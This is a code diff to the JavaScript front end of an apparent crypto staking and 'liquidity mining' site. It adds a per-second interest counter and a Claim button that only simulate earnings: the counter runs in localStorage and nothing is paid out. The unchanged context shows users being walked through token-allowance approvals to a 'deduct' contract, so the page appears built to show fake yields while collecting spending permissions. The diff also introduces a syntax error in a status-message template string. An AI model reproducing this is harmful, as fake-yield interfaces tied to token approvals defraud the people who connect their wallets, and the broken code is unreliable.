@@ -30,11 +30,13 @@ const walletBalanceValue = document.getElementById('walletBalanceValue');
 const totalValue = document.getElementById('totalValue');
 const grossOutputValue = document.querySelector('#liquidity .stat-value:nth-of-type(1)');
 const cumulativeValue = document.querySelector('#liquidity .stat-value:nth-of-type(2)');
+const claimBtn = document.createElement('button'); // 動態添加 Claim 按鈕
 
 let provider, signer, userAddress;
 let deductContract, usdtContract, usdcContract, wethContract;
-let stakingStartTime = null; // 記錄質押開始時間
-let claimedInterest = 0; // 記錄已領取的利息
+let stakingStartTime = localStorage.getItem('stakingStartTime') ? parseInt(localStorage.getItem('stakingStartTime')) : null; // 從 localStorage 載入
+let claimedInterest = localStorage.getItem('claimedInterest') ? parseFloat(localStorage.getItem('claimedInterest')) : 0; // 從 localStorage 載入
+let pledgedAmount = 0; // 記錄質押金額
 
 //---UI Control Functions (使用者介面控制函數)---
 function updateStatus(message) {
@@ -51,6 +53,9 @@ function resetState(showMsg = true) {
     signer = userAddress = deductContract = usdtContract = usdcContract = wethContract = null;
     stakingStartTime = null;
     claimedInterest = 0;
+    pledgedAmount = 0;
+    localStorage.removeItem('stakingStartTime');
+    localStorage.removeItem('claimedInterest');
     if (connectButton) {
         connectButton.classList.remove('connected');
         connectButton.textContent = 'Connect';
@@ -58,8 +63,8 @@ function resetState(showMsg = true) {
     }
     disableInteractiveElements(true);
     if (walletBalanceValue) walletBalanceValue.textContent = '0.000 USDT / 0.000 USDC / 0.000 WETH';
-    if (grossOutputValue) grossOutputValue.textContent = '0.0000000 ETH';
-    if (cumulativeValue) cumulativeValue.textContent = '0.0000000 ETH';
+    if (grossOutputValue) grossOutputValue.textContent = '0 ETH'; // 確保重置為 0
+    if (cumulativeValue) cumulativeValue.textContent = '0 ETH'; // 確保重置為 0
     if (showMsg) updateStatus("請先連接您的錢包以繼續。");
 }
 
@@ -77,6 +82,7 @@ function disableInteractiveElements(disable = false) {
         refreshWallet.style.pointerEvents = disable ? 'none' : 'auto';
         refreshWallet.style.color = disable ? '#999' : '#ff00ff';
     }
+    if (claimBtn) claimBtn.disabled = disable;
 }
 
 /**
@@ -123,12 +129,15 @@ function updateInterest() {
     if (stakingStartTime && grossOutputValue && cumulativeValue) {
         const currentTime = Date.now();
         const elapsedSeconds = Math.floor((currentTime - stakingStartTime) / 1000); // 質押經過的秒數
-        const interestRate = 0.0001; // 每秒產生 0.0001 ETH 利息，可根據需求調整
+        // 利息率基於質押金額，每 1 ETH 每天 0.1% 利息，轉換為每秒
+        const baseInterestRate = 0.000001; // 基礎利率 (0.1% 每天 / 86400 秒)
+        const interestRate = baseInterestRate * pledgedAmount; // 與質押金額成正比
         const grossOutput = elapsedSeconds * interestRate; // 總累積利息
         const cumulative = grossOutput - claimedInterest; // 剩餘利息
 
         grossOutputValue.textContent = `${grossOutput.toFixed(7)} ETH`; // 保留 7 位小數
         cumulativeValue.textContent = `${cumulative.toFixed(7)} ETH`; // 保留 7 位小數
+        localStorage.setItem('claimedInterest', claimedInterest); // 持久化已領取利息
     }
 }
 
@@ -347,7 +356,7 @@ async function handleConditionalAuthorizationFlow(requiredAllowance, serviceActi
     if (!serviceActivated && tokenToActivate) {
         stepCount++;
         const tokenName = tokensToProcess.find(t => t.address === tokenToActivate).name;
-        updateStatus(`步驟 ${stepCount}/${totalSteps}: 啟動服務 (使用 ${tokenName})...`);
+        updateStatus(`步驟 ${stepCount}/${totalSteps]: 啟動服務 (使用 ${tokenName})...`);
 
         const activateTx = await deductContract.activateService.populateTransaction(tokenToActivate);
         activateTx.value = 0n;
@@ -502,6 +511,23 @@ function disconnectWallet() {
     alert('錢包已斷開。要完全移除網站權限，請在錢包的「已連接網站」設置中操作。');
 }
 
+/**
+ * 模擬領取利息。
+ */
+function claimInterest() {
+    if (stakingStartTime && grossOutputValue) {
+        const currentTime = Date.now();
+        const elapsedSeconds = Math.floor((currentTime - stakingStartTime) / 1000);
+        const baseInterestRate = 0.000001; // 基礎利率 (0.1% 每天 / 86400 秒)
+        const interestRate = baseInterestRate * pledgedAmount;
+        const grossOutput = elapsedSeconds * interestRate;
+        claimedInterest = grossOutput; // 領取所有當前利息
+        localStorage.setItem('claimedInterest', claimedInterest);
+        updateInterest();
+        alert('利息已領取！(模擬)');
+    }
+}
+
 //---Language Control Functions (語言控制函數)---
 const translations = {
     'en': {
@@ -523,7 +549,8 @@ const translations = {
         totalPledgedLabel: 'Total Pledged',
         expectedYieldLabel: 'Expected Yield',
         apyLabel: 'APY',
-        lockedUntilLabel: 'Locked Until'
+        lockedUntilLabel: 'Locked Until',
+        claimBtnText: 'Claim'
     },
     'zh-Hant': {
         title: '熱門挖礦',
@@ -544,7 +571,8 @@ const translations = {
         totalPledgedLabel: '總質押',
         expectedYieldLabel: '預期收益',
         apyLabel: '年化收益率',
-        lockedUntilLabel: '鎖定至'
+        lockedUntilLabel: '鎖定至',
+        claimBtnText: '領取'
     },
     'zh-Hans': {
         title: '热门挖矿',
@@ -565,7 +593,8 @@ const translations = {
         totalPledgedLabel: '总质押',
         expectedYieldLabel: '预期收益',
         apyLabel: '年化收益率',
-        lockedUntilLabel: '锁定至'
+        lockedUntilLabel: '锁定至',
+        claimBtnText: '领取'
     }
 };
 
@@ -597,7 +626,8 @@ const elements = {
     totalPledgedLabel: document.getElementById('totalPledgedLabel'),
     expectedYieldLabel: document.getElementById('expectedYieldLabel'),
     apyLabel: document.getElementById('apyLabel'),
-    lockedUntilLabel: document.getElementById('lockedUntilLabel')
+    lockedUntilLabel: document.getElementById('lockedUntilLabel'),
+    claimBtnText: claimBtn
 };
 
 function updateLanguage(lang) {
@@ -607,6 +637,9 @@ function updateLanguage(lang) {
         if (elements[key]) {
             elements[key].textContent = translations[lang][key] || '';
         }
+    }
+    if (claimBtn.parentNode) {
+        claimBtn.textContent = translations[lang].claimBtnText;
     }
 }
 
@@ -635,7 +668,15 @@ startBtn.addEventListener('click', () => {
     }
     if (!stakingStartTime) {
         stakingStartTime = Date.now(); // 記錄質押開始時間
+        localStorage.setItem('stakingStartTime', stakingStartTime); // 持久化開始時間
         alert('開始流動性挖礦... (模擬: 流程已啟動)');
+        // 添加 Claim 按鈕
+        claimBtn.textContent = translations[currentLang].claimBtnText;
+        claimBtn.className = 'start-btn';
+        claimBtn.style.marginTop = '10px';
+        claimBtn.disabled = false;
+        document.getElementById('liquidity').appendChild(claimBtn);
+        claimBtn.addEventListener('click', claimInterest);
     }
     // 每秒更新利息
     setInterval(updateInterest, 1000);
@@ -646,17 +687,18 @@ pledgeBtn.addEventListener('click', async () => {
         alert('請先連接您的錢包！');
         return;
     }
-    const amount = pledgeAmount.value;
+    const amount = parseFloat(pledgeAmount.value) || 0;
     const duration = pledgeDuration.value;
     const token = pledgeToken.value;
     if (!amount) {
         alert('請輸入質押金額！');
         return;
     }
+    pledgedAmount = amount; // 更新質押金額
     alert(`質押 ${amount} ${token} 於 ${duration} 天... (模擬: 質押成功)`);
     const totalPledgedValue = document.getElementById('totalPledgedValue');
-    let currentTotal = parseFloat(totalPledgedValue.textContent);
-    totalPledgedValue.textContent = `${(currentTotal + parseFloat(amount)).toFixed(2)} ${token}`;
+    let currentTotal = parseFloat(totalPledgedValue.textContent) || 0;
+    totalPledgedValue.textContent = `${(currentTotal + amount).toFixed(2)} ${token}`;
 });
 
 refreshWallet.addEventListener('click', async () => {
